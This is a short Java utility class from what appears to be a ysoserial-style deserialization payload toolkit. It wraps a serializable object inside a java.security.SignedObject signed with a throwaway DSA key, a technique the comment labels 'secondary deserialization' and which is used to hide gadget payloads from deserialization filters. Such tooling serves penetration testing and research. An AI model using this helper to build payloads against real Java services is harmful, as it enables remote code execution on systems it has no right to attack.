package org.su18.ysuserial.payloads.util;

import java.io.Serializable;
import java.security.*;

/**
 * 二次反序列化
 *
 * @author su18
 */
public class SignedObjectUtils {

	public static SignedObject warpWithSignedObject(Serializable obj) throws Exception {
		KeyPairGenerator keyPairGenerator;
		keyPairGenerator = KeyPairGenerator.getInstance("DSA");
		keyPairGenerator.initialize(1024);
		KeyPair    keyPair       = keyPairGenerator.genKeyPair();
		PrivateKey privateKey    = keyPair.getPrivate();
		Signature  signingEngine = Signature.getInstance("DSA");
		return new java.security.SignedObject(obj, privateKey, signingEngine);
	}
}
